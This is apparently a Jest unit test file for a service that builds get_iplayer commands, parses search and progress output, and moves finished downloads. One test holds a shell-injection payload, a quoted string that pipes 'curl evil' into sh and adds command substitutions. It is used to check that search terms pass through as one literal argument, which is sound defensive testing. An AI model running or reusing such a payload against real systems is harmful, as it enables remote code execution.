import fs from 'fs';

import configService from '../../src/service/configService';
import { GetIplayerExecutableService } from '../../src/service/getIplayerExecutableService';
import historyService from '../../src/service/historyService';
import queueService from '../../src/service/queueService';
import SkyhookService from '../../src/service/skyhook/SkyhookService';
import socketService from '../../src/service/socketService';
import synonymService from '../../src/service/synonymService';
import { IplayarrParameter } from '../../src/types/IplayarrParameters';
import { IPlayerSearchResult, VideoType } from '../../src/types/IPlayerSearchResult';
import { Synonym } from '../../src/types/Synonym';

jest.mock('bcrypt', () => ({
    hash: jest.fn().mockResolvedValue('$2b$10$mockedhash'),
    compare: jest.fn().mockResolvedValue(false),
}));

jest.mock('../../src/service/configService');
const mockedConfigService = jest.mocked(configService);
jest.mock('../../src/service/historyService');
jest.mock('../../src/service/loggingService');
jest.mock('../../src/service/queueService');
jest.mock('../../src/service/socketService');
jest.mock('../../src/service/synonymService');
jest.mock('../../src/service/skyhook/SkyhookService');
const mockedSynonymService = jest.mocked(synonymService);
const mockedSkyhookService = jest.mocked(SkyhookService);
jest.mock('fs');
jest.mock('path');

describe('GetIplayerExecutableService', () => {
    let service: GetIplayerExecutableService;

    beforeEach(() => {
        service = new GetIplayerExecutableService();
        jest.clearAllMocks();
    });

    describe('getQualityFallbackChain', () => {
        it('prefers the quality stored on the queue entry over VIDEO_QUALITY', async () => {
            mockedConfigService.getParameter.mockResolvedValue('hd');
            queueService.getFromQueue = jest.fn().mockReturnValue({ library: { quality: 'sd' } });
            expect(await service.getQualityFallbackChain('p0abc123')).toEqual(['sd', 'hd', 'web', 'mobile']);
        });

        it('reads the quality of the named job when the programme has several', async () => {
            mockedConfigService.getParameter.mockResolvedValue('hd');
            queueService.getFromQueue = jest.fn().mockImplementation((_pid: string, jobId?: string) => (jobId === 'job-2' ? { library: { quality: 'web' } } : undefined));
            expect((await service.getQualityFallbackChain('p0abc123', 'job-2'))[0]).toBe('web');
            expect(queueService.getFromQueue).toHaveBeenCalledWith('p0abc123', 'job-2');
        });

        it('falls back to VIDEO_QUALITY with no queue entry', async () => {
            mockedConfigService.getParameter.mockResolvedValue('fhd');
            queueService.getFromQueue = jest.fn().mockReturnValue(undefined);
            expect((await service.getQualityFallbackChain('p0abc123'))[0]).toBe('fhd');
        });
    });

    describe('getIPlayerExec', () => {
        it('should return exec and args with profile-dir if cacheLocation exists', async () => {
            const mockCacheLocation = '/mock/cache';
            process.env.CACHE_LOCATION = mockCacheLocation;
            const mockExec = 'mock_exec';
            const mockArgs = ['arg1', 'arg2'];

            mockedConfigService.getParameter.mockImplementation((key: IplayarrParameter) => {
                if (key === IplayarrParameter.GET_IPLAYER_EXEC)
                    return Promise.resolve(`${mockExec} ${mockArgs.join(' ')}`);
                return Promise.resolve(undefined);
            });

            const result = await service.getIPlayerExec();

            expect(result.exec).toBe(mockExec);
            expect(result.args).toContain('--encoding-console-out');
            expect(result.args).toContain('UTF-8');
            expect(result.args).toContain('--profile-dir');
            expect(result.args).toContain('/mock/cache');
            mockArgs.forEach((arg) => {
                expect(result.args).toContain(arg);
            });
        });

        it('should return exec and args without profile-dir if cacheLocation does not exist', async () => {
            delete process.env.CACHE_LOCATION;
            const mockExec = 'mock_exec';
            const mockArgs = ['arg1', 'arg2'];

            mockedConfigService.getParameter.mockImplementation((key: IplayarrParameter) => {
                if (key === IplayarrParameter.GET_IPLAYER_EXEC)
                    return Promise.resolve(`${mockExec} ${mockArgs.join(' ')}`);
                return Promise.resolve(undefined);
            });

            const result = await service.getIPlayerExec();

            expect(result.exec).toBe(mockExec);
            expect(result.args).toContain('--encoding-console-out');
            expect(result.args).toContain('UTF-8');
            expect(result.args).not.toContain('--profile-dir');
        });

        it('should fallback to get_iplayer exec if GET_IPLAYER_EXEC is not set', async () => {
            mockedConfigService.getParameter.mockImplementation((key: IplayarrParameter) => {
                if (key === IplayarrParameter.GET_IPLAYER_EXEC) return Promise.resolve(undefined);
                return Promise.resolve(undefined);
            });

            const result = await service.getIPlayerExec();

            expect(result.exec).toBe('get_iplayer');
        });
    });

    describe('getAllDownloadParameters', () => {
        it('should return download parameters with the correct args', async () => {
            const mockPid = '12345';
            const mockDownloadDir = '/mock/download';
            const mockExec = 'mock_exec';
            const mockArgs = ['arg1', 'arg2'];

            mockedConfigService.getParameter.mockImplementation((key: IplayarrParameter) => {
                if (key === IplayarrParameter.GET_IPLAYER_EXEC)
                    return Promise.resolve(`${mockExec} ${mockArgs.join(' ')}`);
                if (key === IplayarrParameter.DOWNLOAD_DIR) return Promise.resolve(mockDownloadDir);
                if (key === IplayarrParameter.ADDITIONAL_IPLAYER_DOWNLOAD_PARAMS) return Promise.resolve('extraParam');
                return Promise.resolve(undefined);
            });

            const result = await service.getAllDownloadParameters(mockPid, `${mockDownloadDir}/${mockPid}`);

            expect(result.exec).toBe(mockExec);
            expect(result.args).toContain('--output');
            expect(result.args).toContain(`${mockDownloadDir}/${mockPid}`);
            expect(result.args).toContain(`--pid=${mockPid}`);
        });

        describe('--versions', () => {
            const versionArgs = async (library?: { version?: string }) => {
                mockedConfigService.getParameter.mockImplementation((key: IplayarrParameter) =>
                    Promise.resolve(key === IplayarrParameter.GET_IPLAYER_EXEC ? 'get_iplayer' : undefined)
                );
                (queueService.getFromQueue as jest.Mock).mockReturnValue(library ? { library } : undefined);
                const { args } = await service.getAllDownloadParameters('p01abc', '/mock/dir', 'job-1');
                return args.filter((arg) => arg.startsWith('--versions'));
            };

            it('asks get_iplayer for the audio described or signed version a queue entry is of', async () => {
                expect(await versionArgs({ version: 'audio-described' })).toEqual(['--versions=audiodescribed']);
                expect(await versionArgs({ version: 'signed' })).toEqual(['--versions=signed']);
                expect(queueService.getFromQueue).toHaveBeenCalledWith('p01abc', 'job-1');
            });

            it('adds nothing for the standard version, an unknown one or no queue entry', async () => {
                expect(await versionArgs({})).toEqual([]);
                expect(await versionArgs({ version: 'bogus' })).toEqual([]);
                expect(await versionArgs()).toEqual([]);
            });
        });
    });

    describe('getSearchParameters', () => {
        it('should return search parameters with the correct args', async () => {
            const mockTerm = 'mock_term';
            const mockSynonym: Synonym = {
                exemptions: 'exempt1,exempt2',
                id: 'synonym-1',
                from: 'Gladiators',
                target: 'Doctor Who',
            };

            const mockExec = 'mock_exec';
            const mockArgs = ['arg1', 'arg2'];

            mockedConfigService.getParameter.mockImplementation((key: IplayarrParameter) => {
                if (key === IplayarrParameter.GET_IPLAYER_EXEC)
                    return Promise.resolve(`${mockExec} ${mockArgs.join(' ')}`);
                return Promise.resolve(undefined);
            });

            const result = await service.getSearchParameters(mockTerm, mockSynonym);

            expect(result.exec).toBe(mockExec);
            expect(result.args.slice(-2)).toEqual(['--', mockTerm]);
            expect(result.args).toContain('--exclude');
            mockSynonym.exemptions.split(',').forEach((exemption: string) => {
                expect(result.args).toContain(exemption);
            });
        });

        it('passes shell metacharacters through as a single literal argument', async () => {
            mockedConfigService.getParameter.mockImplementation((key: IplayarrParameter) =>
                Promise.resolve(key === IplayarrParameter.GET_IPLAYER_EXEC ? 'get_iplayer --profile-dir "/a b"' : undefined)
            );
            const payload = '"; curl evil | sh; $(id) `id` --exec=x';

            const result = await service.getSearchParameters(payload);

            expect(result.args.slice(-2)).toEqual(['--', payload]);
            expect(result.args).toContain('/a b');
            expect(result.args.some((a: string) => a.includes('"/a b"'))).toBe(false);
        });

        it('should handle "*" as term and add available-since parameter', async () => {
            const mockTerm = '*';
            const mockRssHours = '24';

            const mockExec = 'mock_exec';
            const mockArgs = ['arg1', 'arg2'];

            mockedConfigService.getParameter.mockImplementation((key: IplayarrParameter) => {
                if (key === IplayarrParameter.GET_IPLAYER_EXEC)
                    return Promise.resolve(`${mockExec} ${mockArgs.join(' ')}`);
                if (key === IplayarrParameter.RSS_FEED_HOURS) return Promise.resolve(mockRssHours);
                return Promise.resolve(undefined);
            });

            const result = await service.getSearchParameters(mockTerm);

            expect(result.args).toContain('--available-since');
            expect(result.args).toContain(mockRssHours);
        });
    });

    describe('logProgress', () => {
        it('should log progress and emit log event', () => {
            const mockPid = '12345';
            const mockData = 'mock progress data';
            const emitSpy = jest.spyOn(socketService, 'emit');

            service.logProgress(mockPid, mockData);

            expect(emitSpy).toHaveBeenCalledWith('log', expect.objectContaining({ id: mockPid, message: mockData }));
        });
    });

    describe('parseProgress', () => {
        it('should return download details if progress regex matches', () => {
            const mockPid = '12345';
            const mockData = '50% of ~24.5 MB @ 30.8 MB/s ETA: 15:20:54  [audio+video]';

            const result = service.parseProgress(mockPid, mockData);

            expect(result).toHaveProperty('progress', 50);
            expect(result).toHaveProperty('size', 24.5);
            expect(result).toHaveProperty('speed', 30.8);
            expect(result).toHaveProperty('eta', '15:20:54');
        });

        it('should return undefined if no progress line matches', () => {
            const mockPid = '12345';
            const mockData = 'no progress data';

            const result = service.parseProgress(mockPid, mockData);

            expect(result).toBeUndefined();
        });
    });

    describe('processCompletedDownload', () => {
        it('should handle completed download and move files', async () => {
            const mockPid = '12345';
            const mockQueueItem = { nzbName: 'mock_nzb' };
            const mockDownloadDir = '/mock/download';
            const mockCompleteDir = '/mock/complete';
            const mockFiles = ['mockfile.mp4'];

            queueService.getFromQueue = jest.fn().mockReturnValue(mockQueueItem);

            (configService.getParameters as jest.Mock).mockImplementation(() => {
                return [mockDownloadDir, mockCompleteDir];
            });

            fs.readdirSync = jest.fn().mockReturnValue(mockFiles);
            fs.copyFileSync = jest.fn();
            fs.rmSync = jest.fn();

            await service.processCompletedDownload(mockPid, 0);

            expect(fs.copyFileSync).toHaveBeenCalled();
            expect(fs.rmSync).toHaveBeenCalled();
            expect(historyService.addHistory).toHaveBeenCalled();
        });

        it('should remove from queue even if no MP4 file found', async () => {
            const mockPid = '12345';
            const mockQueueItem = { nzbName: 'mock_nzb' };
            const mockDownloadDir = '/mock/download';
            const mockCompleteDir = '/mock/complete';

            queueService.getFromQueue = jest.fn().mockReturnValue(mockQueueItem);

            (configService.getParameters as jest.Mock).mockImplementation(() => {
                return [mockDownloadDir, mockCompleteDir];
            });

            fs.readdirSync = jest.fn().mockReturnValue([]);
            fs.copyFileSync = jest.fn();
            fs.rmSync = jest.fn();

            await service.processCompletedDownload(mockPid, 0);

            expect(queueService.removeFromQueue).toHaveBeenCalled();
        });
    });

    describe('parseResults', () => {
        it('should correctly parse search results and return structured data', async () => {
            const mockTerm = 'test';
            const mockData = 'RESULT|:|12345|:|test title|:| |:| |:|1|:|BBC|:|120|:|2021-01-01|:|episode title';
            const mockSizeFactor = 1;
            mockedSkyhookService.lookupSeriesDetails.mockResolvedValue({ series: 1, episode: 1 });

            const results = await service.parseResults(mockTerm, mockData, mockSizeFactor);

            expect(results).toHaveLength(1);
            expect(results[0]).toHaveProperty('pid', '12345');
            expect(results[0]).toHaveProperty('title', 'test title');
        });
    });

    describe('processCompletedSearch', () => {
        it('should process results and create NZB name with synonym override when title matches', async () => {
            const mockResults: IPlayerSearchResult[] = [
                {
                    pid: '12345',
                    title: 'Test Title',
                    number: 0,
                    channel: 'BBC One',
                    request: {
                        term: 'Term',
                        line: 'line',
                    },
                    type: VideoType.TV,
                },
                {
                    pid: '67890',
                    title: 'Different Title',
                    number: 1,
                    channel: 'BBC Two',
                    request: {
                        term: 'Term',
                        line: 'line',
                    },
                    type: VideoType.TV,
                },
            ];
            const mockSynonym: Synonym = {
                filenameOverride: 'test.nzb',
                id: 'synonym-1',
                from: 'Test Title',
                target: 'Test Title',
                exemptions: '',
            };

            mockedConfigService.getParameter.mockImplementation((key: IplayarrParameter) => {
                if (key === IplayarrParameter.VIDEO_QUALITY) return Promise.resolve('hd');
                if (key === IplayarrParameter.TV_FILENAME_TEMPLATE)
                    return Promise.resolve('TV-{{title}}-{{synonym}}-{{quality}}');
                if (key === IplayarrParameter.MOVIE_FILENAME_TEMPLATE)
                    return Promise.resolve('Movie-{{title}}-{{synonym}}-{{quality}}');
                return Promise.resolve(undefined);
            });

            const results = await service.processCompletedSearch(mockResults, mockSynonym);

            expect(results[0]).toHaveProperty('nzbName', 'TV-Test.Title-test.nzb-720p');
            expect(results[1]).toHaveProperty('nzbName', 'TV-Different.Title--720p');
            expect(mockedSynonymService.getSynonym).not.toHaveBeenCalled();
        });

        it('should look up synonym if not passed in', async () => {
            const mockResults: IPlayerSearchResult[] = [
                {
                    pid: '12345',
                    title: 'Test Title',
                    number: 0,
                    channel: 'BBC One',
                    request: {
                        term: 'Term',
                        line: 'line',
                    },
                    type: VideoType.TV,
                },
                {
                    pid: '67890',
                    title: 'Different Title',
                    number: 1,
                    channel: 'BBC Two',
                    request: {
                        term: 'Term',
                        line: 'line',
                    },
                    type: VideoType.TV,
                },
            ];
            const mockSynonym: Synonym = {
                filenameOverride: 'test.nzb',
                id: 'synonym-1',
                from: 'From',
                target: 'Test Title',
                exemptions: '',
            };

            mockedConfigService.getParameter.mockImplementation((key: IplayarrParameter) => {
                if (key === IplayarrParameter.VIDEO_QUALITY) return Promise.resolve('hd');
                if (key === IplayarrParameter.TV_FILENAME_TEMPLATE)
                    return Promise.resolve('TV-{{title}}-{{synonym}}-{{quality}}');
                if (key === IplayarrParameter.MOVIE_FILENAME_TEMPLATE)
                    return Promise.resolve('Movie-{{title}}-{{synonym}}-{{quality}}');
                return Promise.resolve(undefined);
            });

            mockedSynonymService.getSynonym.mockResolvedValue(mockSynonym);

            const results = await service.processCompletedSearch(mockResults, undefined);

            expect(results[0]).toHaveProperty('nzbName', 'TV-Test.Title-test.nzb-720p');
            expect(results[1]).toHaveProperty('nzbName', 'TV-Different.Title--720p');
            expect(synonymService.getSynonym).toHaveBeenCalledWith('Test Title');
        });
    });

    describe('branches', () => {
        it('moves an .mkv download as well as an .mp4', async () => {
            queueService.getFromQueue = jest.fn().mockReturnValue({ nzbName: 'mock_nzb' });
            (configService.getParameters as jest.Mock).mockImplementation(() => ['/mock/download', '/mock/complete']);
            fs.readdirSync = jest.fn().mockReturnValue(['notes.txt', 'clip.mkv']);
            fs.copyFileSync = jest.fn();
            fs.rmSync = jest.fn();

            await service.processCompletedDownload('12345', 0);

            expect(fs.copyFileSync).toHaveBeenCalledTimes(1);
            expect(historyService.addHistory).toHaveBeenCalled();
        });

        it('does nothing to the files when the download did not succeed', async () => {
            (configService.getParameters as jest.Mock).mockImplementation(() => ['/mock/download', '/mock/complete']);
            fs.copyFileSync = jest.fn();
            fs.rmSync = jest.fn();

            await service.processCompletedDownload('12345', 1);

            expect(fs.copyFileSync).not.toHaveBeenCalled();
            expect(fs.rmSync).not.toHaveBeenCalled();
            expect(queueService.removeFromQueue).toHaveBeenCalledWith('12345');
        });

        it('uses the configured quality when there is no programme to look up', async () => {
            mockedConfigService.getParameter.mockResolvedValue('fhd');
            expect(await service.getQualityFallbackChain()).toEqual(['fhd', 'hd', 'sd', 'web', 'mobile']);
        });

        it('parses a result with no duration, date or episode details', async () => {
            const line = 'RESULT|:|12345|:|Plain title|:||:||:|1|:|BBC|:||:||:|';
            const [result] = await service.parseResults('plain', line, 1);
            expect(result).toMatchObject({ pid: '12345', title: 'Plain title', size: undefined, pubDate: undefined, runtimeSeconds: undefined });
        });

        it('treats a duration that is not a number as unknown', async () => {
            const line = 'RESULT|:|12345|:|Plain title|:||:||:|1|:|BBC|:|soon|:||:|';
            const [result] = await service.parseResults('plain', line, 1);
            expect(result.size).toBeUndefined();
            expect(result.runtimeSeconds).toBeUndefined();
        });

        it('scales a duration by the size factor and reads the air date', async () => {
            const line = 'RESULT|:|12345|:|Plain title|:||:||:|1|:|BBC|:|600|:|2021-01-01T10:00:00Z|:||:|';
            const [result] = await service.parseResults('plain', line, 0.5);
            expect(result).toMatchObject({ size: 300, runtimeSeconds: 600 });
            expect(result.pubDate).toEqual(new Date('2021-01-01T10:00:00Z'));
        });
    });
});
